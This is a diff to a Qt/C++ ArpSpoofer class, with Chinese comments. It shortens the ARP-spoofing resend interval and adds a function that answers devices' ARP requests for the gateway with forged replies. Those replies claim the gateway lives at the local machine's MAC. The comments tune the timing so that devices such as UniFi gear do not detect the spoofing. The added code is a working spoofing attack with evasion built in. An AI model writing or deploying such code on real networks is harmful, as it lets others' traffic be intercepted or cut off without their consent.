@@ -6,8 +6,12 @@
 #include <QHostAddress>
 #include <QTimer>
 
-// 重发周期：ARP 缓存有老化时间，1.5s 足以在设备/网关刷新前压住正确条目。
-static constexpr int kSpoofIntervalMs = 1500;
+#include <cstring>
+
+// 重发周期：主力是 answerGatewayArp 的「一问就抢答」，周期重发只作兜底（设备缓存未过期、
+// 不主动 ARP 的间隙里，抵消真网关可能发来的 gratuitous ARP）。1s 比原来的 1.5s 更压得住，
+// 又不至于像几百毫秒那样像 ARP 风暴、招 UniFi 这类设备的防护。
+static constexpr int kSpoofIntervalMs = 1000;
 // heal 连发遍数：多发几遍抵消可能滞留的欺骗缓存，确保设备恢复联网。
 static constexpr int kHealRepeat = 3;
 
@@ -68,6 +72,37 @@ void ArpSpoofer::stopSpoof(const QString &victimMac)
     m_victims.erase(it);
     if (m_victims.isEmpty() && m_timer->isActive())
         m_timer->stop();
+}
+
+bool ArpSpoofer::answerGatewayArp(const QByteArray &frame)
+{
+    if (!m_endpoint || !configured())
+        return false;
+    // 完整以太 + ARP 至少 42 字节：14 以太头 + 28 ARP 载荷。
+    if (frame.size() < 42)
+        return false;
+    const uchar *f = reinterpret_cast<const uchar *>(frame.constData());
+    // ethertype 必须是 ARP(0x0806)、op 必须是 request(1)。htype/ptype/hlen/plen 按以太+IPv4 校验，
+    // 免得把别的 ARP 变种误当请求。
+    if (f[12] != 0x08 || f[13] != 0x06)
+        return false;
+    if (f[14] != 0x00 || f[15] != 0x01 || f[16] != 0x08 || f[17] != 0x00 || f[18] != 6 || f[19] != 4)
+        return false;
+    if (f[20] != 0x00 || f[21] != 0x01) // op=1 request
+        return false;
+
+    // ARP 载荷：sha=f[22..27], spa=f[28..31], tpa=f[38..41]。
+    // 只对「问的正是我们冒充的那个网关 IP」抢答。
+    if (std::memcmp(f + 38, m_gatewayIp.constData(), 4) != 0)
+        return false;
+
+    const QByteArray senderMac(reinterpret_cast<const char *>(f + 22), 6); // 设备 MAC
+    const QByteArray senderIp(reinterpret_cast<const char *>(f + 28), 4);  // 设备 IP
+    // 回一帧欺骗 reply 给设备：sha=本机MAC, spa=网关IP → 「网关在本机」。目的就是发起请求的设备。
+    const QByteArray reply =
+            buildArpReply(senderMac, m_localMac, m_localMac, m_gatewayIp, senderMac, senderIp);
+    m_endpoint->send(reply);
+    return true;
 }
 
 void ArpSpoofer::healAll()
